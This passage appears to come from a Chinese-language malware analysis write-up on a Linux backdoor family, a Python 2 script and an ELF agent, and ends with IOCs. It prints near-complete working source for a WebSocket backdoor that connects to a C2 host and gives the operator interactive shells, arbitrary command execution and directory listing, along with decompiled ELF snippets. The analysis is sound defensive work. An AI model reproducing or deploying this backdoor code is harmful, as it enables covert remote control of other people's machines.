          base,items,err=fm_list(m.get('path','/tmp')); send(s,{'type':'fm_result','req':m.get('req'),'base':base,'items':items,'error':err})
    except Exception as e: time.sleep(2)
```

这是整个后门的调度中枢。外层一直重试连线，连上先发个 hello 把节点 ID、主机名、当前用户、系统信息报给控制端报到。然后进入内层死循环收消息，按消息里的 type 字段分派活儿：收到 shell_open 就开个交互终端，收到 shell_in 就把数据喂进对应终端，收到 cmd_exec 就用 subprocess 跑一条带超时的命令并把输出和退出码回传，超时了就 kill 掉别卡着，收到 fm_list 就列目录回传。

这其实就是 s 文件那套取令执行回传的思路，但从单向轮询升级成了 WebSocket 双向长连接，能同时管 shell、命令、文件三类活儿，功能丰富得多。任何环节出异常就睡两秒重连，保证后门断了也能自己接回来。

#### 文件3：p2（py脚本）

##### 1、威胁情报平台分析

VT判断为py脚本

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/f8b5097c2d1dd07e.png)

打开文件开始分析，脚本python2写的

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/eecaddb49d792e1b.png)

##### 2、功能模块分析

###### 模块1：C2 与节点身份配置

```python
C2='http://47.xx.xx.xx'; TOKEN='sbScLgnSQpClvQhZTshHfKF5_FAxBU3U'; NODE_FILE='/dev/shm/.Xpy2-cache'
GUID='258EAFA5-E914-47DA-95CA-C5AB0DC85B11'
```

这和上一个P文件基本相同，节点文件叫.Xpy2-cache，多了个 2 字和 p 区分，免得两个后门挤在一台机器上抢身份文件，也是放 /dev/shm 内存盘自隐藏。那个 GUID 还是 WebSocket 协议规定要用的魔法串。

###### 模块2：节点 ID 生成与读取

```python
def nodeid():
    try: return open(NODE_FILE).read().strip()
    except: pass
    x=str(uuid.uuid4())[:8]
    try: open(NODE_FILE,'w').write(x)
    except: pass
    return x
NID=nodeid()
```

这段和 p 一模一样，这里不重复说。

###### 模块3：URL 解析

```python
def parse_url(u):
    if u.startswith('http://'): scheme='http'; rest=u[7:]
    elif u.startswith('https://'): scheme='https'; rest=u[8:]
    else: scheme='http'; rest=u
    hostport=rest.split('/',1)[0]
    if ':' in hostport:
        host,port=hostport.rsplit(':',1); port=int(port)
    else:
        host=hostport; port=443 if scheme=='https' else 80
    return scheme,host,port
```

这是 p2 不得已自己写的 URL 解析，因为 Python2 没有现成的 urllib.parse 可用。手写协议头、主机、端口，没给端口就按 https 默认 443、http 默认 80 兜底。功能上等价于 p 的 ws_url，只是写法更原始，能看出来是为了适应 Python2 老环境。

###### 模块4：建立 WebSocket 连接

```python
def connect():
    scheme,host,port=parse_url(C2); path='/agent?token='+TOKEN+'&id='+NID
    s=socket.create_connection((host,port),20)
    if scheme=='https': s=ssl.wrap_socket(s)
    key=base64.b64encode(os.urandom(16))
    req='GET %s HTTP/1.1\r\nHost: %s:%s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n'%(path,host,port,key)
    s.sendall(req); resp=s.recv(4096)
    if '101' not in resp.split('\r\n',1)[0]: raise Exception(resp[:80])
    return s
```

和 p 文件一样手搓 WebSocket 握手建长连接，告别 s 文件的明文轮询。建 TCP 连接，https 就裹 ssl，但这有个退化点，ssl.wrap_socket 没传 server_hostname 参数，在 Python2 上这是可以的，但 SNI 处理上不如 p 的写法严谨，可能匹配虚拟主机会有问题。

握手还是发 GET 带随机 Sec-WebSocket-Key，等服务端回 101 算成功。路径走 /agent 带 token 和 id。

###### 模块5：WebSocket 帧收发

```python
def send(s,obj):
    data=json.dumps(obj,ensure_ascii=False)
    if isinstance(data,unicode): data=data.encode('utf-8')
    ln=len(data); mask=os.urandom(4); head='\x81'
    if ln<126: head+=chr(0x80|ln)
    elif ln<65536: head+=chr(0x80|126)+struct.pack('!H',ln)
    else: head+=chr(0x80|127)+struct.pack('!Q',ln)
    out=[]
    for i,c in enumerate(data): out.append(chr(ord(c)^ord(mask[i%4])))
    s.sendall(head+mask+''.join(out))
def recvn(s,n):
    d=''
    while len(d)<n:
        c=s.recv(n-len(d))
        if not c: return None
        d+=c
    return d
def recv(s):
    h=recvn(s,2)
    if not h: return None
    b1=ord(h[0]); b2=ord(h[1]); ln=b2&127
    if ln==126: ln=struct.unpack('!H',recvn(s,2))[0]
    elif ln==127: ln=struct.unpack('!Q',recvn(s,8))[0]
    data=recvn(s,ln)
    if data is None: return None
    if (b1&15)==8: return None
    return json.loads(data.decode('utf-8','ignore'))
```

这俩函数和 p 一样是自己手写 WebSocket 协议封包解包，不引第三方库。send 把 JSON 打成帧按长度分档填头，再按规矩用随机掩码异或一遍。但这里有个 Python2 特有的写法，先把 unicode 字符串 encode 成 bytes 再处理，掩码异或时逐字符 ord 转换，处理大消息会比 p 的生成器写法更笨重一些。recv 配合一个 recvn 保证读够指定字节数，再解帧取 JSON。功能上和 pwubi 等价，就是代码更原始、不依赖库、难被库特征检测到。

###### 模块6：交互式 Shell 会话

```python
shells={}
def sh_open(s,sid):
    if sid in shells: return
    pid,fd=pty.fork()
    if pid==0:
        os.environ['TERM']='xterm-256color'; os.environ['SHELL']='/bin/bash' if os.path.exists('/bin/bash') else '/bin/sh'; sh=os.environ['SHELL']; os.execl(sh, os.basename(sh) if hasattr(os,'basename') else sh, '-i')
    fcntl.fcntl(fd, fcntl.F_SETFL, os.O_NONBLOCK)
    shells[sid]=(pid,fd)
    def reader():
        while sid in shells:
            try:
                r,_,_=select.select([fd],[],[],0.2)
                if r:
                    data=os.read(fd,4096)
                    if data: send(s,{'type':'shell_out','sid':sid,'data':data})
            except Exception: break
        try: os.close(fd)
        except: pass
    threading.Thread(target=reader).start()
```

这里和 p 文件一样支持完整交互式终端。pty.fork 起个伪终端跑交互式 bash 或 sh，vim、top、sudo 这种要 TTY 的命令都能跑，比 s文件 那种干跑一条命令强太多。父进程把终端设非阻塞，起个后台线程盯着有输出就推给控制端，输入那边收到 shell_in 就写进去。多会话靠 sid 区分，能并排挂好几个 shell。这等于给攻击者开了随进随出的活门，危害显著。和 p 文件唯一细微差别是 reader 线程没加 daemon 参数，Python2 里默认就不是守护线程，进程退出时可能挂一下，但实际影响不大。

###### 模块7：文件管理列表

```python
def fm_list(path):
    if not os.path.isdir(path): path=os.path.dirname(path) or '/'
    items=[]
    try:
        for name in sorted(os.listdir(path)):
            fp=os.path.join(path,name)
            try:
                st=os.lstat(fp); items.append({'name':name,'path':fp,'type':'d' if os.path.isdir(fp) else 'f','size':st.st_size,'mode':oct(st.st_mode)[-3:],'mtime':int(st.st_mtime)})
            except: pass
    except Exception as e: return path,[],str(e)
    return path,items,''
```

这里和 p 文件一模一样的文件浏览功能，这里不做重复叙述。

###### 模块8：主循环与消息分发

```python
def main():
  while True:
    try:
      s=connect(); send(s,{'type':'hello','id':NID,'host':socket.gethostname(),'user':subprocess.Popen('id -un 2>/dev/null',shell=True,stdout=subprocess.PIPE).communicate()[0].strip(),'os':subprocess.Popen('uname -a 2>/dev/null',shell=True,stdout=subprocess.PIPE).communicate()[0].strip()})
      while True:
        m=recv(s)
        if not m: break
        t=m.get('type')
        if t=='shell_open': sh_open(s,m['sid'])
        elif t=='shell_in':
          sid=m['sid']; data=m.get('data','')
          if sid in shells: os.write(shells[sid][1], data.encode('utf-8') if isinstance(data,unicode) else data)
        elif t=='cmd_exec':
          req=m.get('req',''); cmd=m.get('cmd',''); timeout=int(m.get('timeout',60) or 60)
          try:
            p=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,stdin=subprocess.PIPE)
            end=time.time()+timeout; out=''
            while time.time()<end and p.poll() is None:
              try:
                r,_,_=select.select([p.stdout],[],[],0.2)
                if r: out+=os.read(p.stdout.fileno(),4096)
              except Exception: break
            if p.poll() is None:
              try: p.kill()
              except Exception: pass
            try: out+=p.stdout.read() or ''
            except Exception: pass
            rc=p.returncode if p.returncode is not None else -9
            send(s,{'type':'cmd_result','req':req,'rc':rc,'out':out})
          except Exception as e:
            send(s,{'type':'cmd_result','req':req,'rc':-1,'out':repr(e)})
        elif t=='fm_list':
          base,items,err=fm_list(m.get('path','/tmp')); send(s,{'type':'fm_result','req':m.get('req'),'base':base,'items':items,'error':err})
    except Exception: time.sleep(3)
```

这是调度中枢，结构和 p 文件也一致，这里不重复叙述。

#### 文件4：mulu-agent-c（elf）

##### 1、威胁情报平台分析

VT标记为恶意木马病毒，elf文件

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/cf80c103a22ea9e1.png) ![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/5d26a059f75af6ba.png)

VT标记的个字段分析：

|     |     |     |
| --- | --- | --- |  
| 字段  | 值   | 含义说明 |
| Class | ELF64 | 64 位 ELF 二进制程序 |
| Data | 2's complement, little endian | 小端序存储（x86_64 架构标准） |
| OS ABI | UNIX - Linux | 面向 Linux 系统 ABI，只能在 Linux 内核环境运行 |
| Object File Type | EXEC (Executable file) | **可执行文件** （不是.o 目标文件、不是.so 共享库、不是 core dump） |
| Required Architecture | Advanced Micro Devices X86-64 | x86_64 /amd64 架构 |
| Program Headers | 6   | 共有 6 个程序头（段头，用于操作系统加载内存） |
| Section Headers | 33  | 共有 33 个节头（用于调试、符号表、反汇编分析） |

##### 2、判断是否加壳

```bash
readelf -S mulu-agent-c
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/2e91831374b6187c.png)

```bash
readelf -h mulu-agent-c
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/2636c05419ad1adc.png)

这里可以看出没加壳，是个静态链接 glibc 编出来的 64 位程序。

##### 3、反编译

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/9c823a02c9d97041.png)

##### 4、功能模块分析

###### 模块1：默认配置与字符串占位

```c
string s_changeme_007010e0;
string s_http://127.0.0.1:8123_00701180;
```

这是全局的两个默认配置字符串。C2 地址默认是 127.0.0.1:8123，是开发时的占位，真实上线靠环境变量覆盖；token 变量名直接叫 changeme，意思是"发布前改我"，说明这是一个半成品式的成品化后门，运营时会用真实值替换默认值。

###### 模块2：环境变量读取覆盖 C2 与 TOKEN

```c
pcVar9 = (char *)FUN_00415ad0("MULU_C2");
if ((pcVar9 != (char *)0x0) && (*pcVar9 != '\0')) {
  FUN_00417fa0(s_http___127_0_0_1_8123_00701180,0x200,"%s",pcVar9);
  FUN_00404cc0(pcVar9);
}
pcVar9 = (char *)FUN_00415ad0("MULU_TK");
if ((pcVar9 != (char *)0x0) && (*pcVar9 != '\0')) {
  FUN_00417fa0(s_changeme_007010e0,0xa0,"%s",pcVar9);
}
```

这段读取环境变量 MULU_C2 和 MULU_TK，只要设了就覆盖默认的 C2 地址和 TOKEN。这是这个家族比 s文件/p/p2 进步的地方 —— 它不在代码里硬编码真实 C2 和 token，而是发布时只编译一份通用二进制，通过环境变量下发具体战役的 C2 和凭证。这样同一个 ELF 能在不同任务里复用，被抓到样本也查不到真实控制端，运营更灵活更隐蔽。前面几个文件里写死的 47.xx.xx.xx 和那串 token，在这个 ELF 里是被改成环境变量下发的，但只要运行环境里设了 MULU_C2=47.xx.xx.xx MULU_TK=sbSc... 行为就完全一致。

###### 模块3：命令行参数与多 C2 列表支持

```c
lVar24 = FUN_00415ad0("MULU_ALLOW_ARGS");
if ((lVar24 != 0) && (1 < param_1)) {
  pcVar9 = (char *)param_2[1];
  ...
  FUN_00417fa0(s_http___127_0_0_1_8123_00701180,0x200,"%s",pcVar9);
}
...
FUN_00416070("MULU_C2_LIST",&local_3038,1);
```

这里设了 MULU_ALLOW_ARGS，它能从命令行参数 argv\[1\] 读 C2、argv\[2\] 读 token，等于又多一条配置通道，方便投放时一行命令临时指定。再往后的 MULU_C2_LIST 是多 C2 列表，把多个 C2 地址用分号或换行串起来传进来，运行时轮换切换，单点挂了自动换下一个。

###### 模块4：工作目录与自隐藏文件名

```c
local_34c8 = "/dev/shm";
pcVar9 = "/dev/shm";
...
FUN_00417fa0(&local_3338,0x200,"%s/.%s-%s",pcVar9,(&PTR_s_dbus_daemon_004cde20)[iVar5], &local_36c8);
```

工作目录还是老样子优先 /dev/shm 内存盘，重启即逝。自隐藏文件名这回换了个新伪装 —— 用 dbus_daemon 这种系统守护进程的名字做前缀，再拼上点东西，存放在内存盘里。

前面是.font-unix、.Xpy-cache 仿 X11 字体和 Python 缓存，这里换成仿 dbus 守护进程，万变不离其宗，就是躲管理员眼皮。每换一个家族成员换个伪装名，但都往 /dev/shm 钻这个习惯没变。

###### 模块5：WebSocket 握手与 hello 上线

```c
FUN_00417fa0(local_3860,0x300,"%s/agent?token=%s&id=%s",local_3858,s_changeme_007010e0, &DAT_00702e80);
...
"GET %s HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: %s==\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n..."
...
"{\"type\":\"hello\",\"id\":\"%s\",\"host\":\"%s\",\"user\":\"%s\",\"os\":\"%s\"}"
```

这段和 p/p2 几乎一字不差：拼 /agent?token=&id= 的 WebSocket 握手 URL，发 GET 带随机 Sec-WebSocket-Key 走 Upgrade，等服务端回 101 切换协议。握手成功后立刻发 hello 消息上报 id、host、user、os 四件套。

```c
if (bVar43) {  // shell_open
  ...
  iVar5 = FUN_0040f980(&local_3038,0,0,0);  // pty fork
  if (iVar5 == 0) {
    FUN_00416070(&DAT_004cd3dd,"xterm-256color",1);
    iVar5 = FUN_0044d9e0("/bin/bash",1);
    pcVar9 = "/bin/bash";
    if (iVar5 != 0) pcVar9 = "/bin/sh";
    FUN_00448ff0(pcVar9,pcVar9,&DAT_004cd3e2,0);
  }
  ...
}
```

收到 shell_open 就 pty fork 起一个伪终端，子进程里设 TERM 为 xterm-256color，有 bash 用 bash 没有就退 sh，然后 execl 成交互式 shell。

父进程把 pty 设非阻塞，起后台线程读 pty 输出回传 shell_out，输入侧收到 shell_in 就写进 pty。和 p/p2 的实现同构，vim、top、sudo 这种要 TTY 的交互命令都能跑，是随进随出的活后门。多会话靠 sid 区分，能并排挂好几个。

###### 模块7：fm_list 文件浏览

```c
elif t == 'fm_list':
  base,items,err=fm_list(m.get('path','/tmp')); ...
```

这条和 p/p2 一样，列出指定目录的内容，每条带大小、权限、修改时间打包成 fm_result 回传。

###### 模块8：cmd_exec 加动态脚本组装执行（本样本最毒的地方）

```c
uVar10 = FUN_004055a0(lVar24,&DAT_004cd3f7);  // 读 req
uVar14 = FUN_004055a0(lVar24,&DAT_004cd3fb);  // 读 cmd
...
FUN_00417fa0(local_3850,0x100,"/dev/shm/.cache-%d-%ld.o",uVar6,uVar15);
FUN_00417fa0(&local_3038,0x100,"/dev/shm/.cache-%d-%ld.s",uVar6,uVar15);
lVar26 = FUN_00418950(&local_3038,&DAT_004cd2f6);  // open .s 脚本文件
...
FUN_00418f00(uVar14,1,uVar15,lVar26);  // 把 cmd 写进 .s 文件
FUN_0041d040(10,lVar26);
...
FUN_00417fa0(&local_2038,700,"/bin/sh %s >%s 2>&1",&local_3038,local_3850);
uVar27 = thunk_FUN_00417bf0(&local_2038);  // system 执行
```

这是这个 ELF 比 p/p2 都狠的地方。收到 cmd_exec 后，它不是直接 system(cmd) 那么简单，而是先把命令写进 /dev/shm/.cache-PID-时间戳.s 这样一个冒充缓存后缀.s 的文件，再拼一条 /bin/sh 那个文件 重定向到.o 输出文件，然后才 system 执行。等于把要执行的命令落地成一个脚本文件再跑，这样既能执行多行复杂脚本、又能把输出规整落到.o 文件方便回传，还顺带实现了一定的命令持久化模板效果。.s 和.o 这种后缀是意图冒充编译中间产物，管理员看到也不容易怀疑。这一手让它的任意命令执行能力比 p/p2 的单条 subprocess 强，能跑成段载荷。

## 五、IOC

### 1、文件哈希

（1）投递器

```c
MD5
e579e7a05f3ca2283d611e5799e1756a
 
SHA-1
4f86f8078479219627258c4813a2800a7f654178
 
SHA-256
702d256533d59c853e9e382c2525b52b7934b023e2e8a97146845473043ae7c1
```

（2） mulu‑agent‑c ELF

```c
MD5
6668dc294d637a317c0651f25823e477
 
SHA-1
03449f94ef50f9c3bf5f1fa8d480810f1350497b
 
SHA-256
55ceed32d9c4570f79017f3877fe51ffbad2e7ab8f40dfc1a5e99e185286c28f
```

### 2、 网络 IOC

```c
C2 地址：http://47.xx.xx.xx
Token：sbScLgnSQpClvQhZTshHfKF5_FAxBU3U
UA：Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
```

接口路径

```c
/.svc/68b0e19e/11080546/c
/.svc/68b0e19e/11080546/s
/.svc/68b0e19e/11080546/p
/.svc/68b0e19e/11080546/p2
```

### 3、文件 & 路径指纹

```c
.font‑unix-id
.font‑unix‑lock
.Xpy‑cache
.Xpy2‑cache
.sys‑id
.sys‑id.lock
.user‑id
.user‑id.lock
```

环境变量指纹

```c
MULU_C2
MULU_C2_LIST
MULU_TK
MULU_ALLOW_ARGS
```
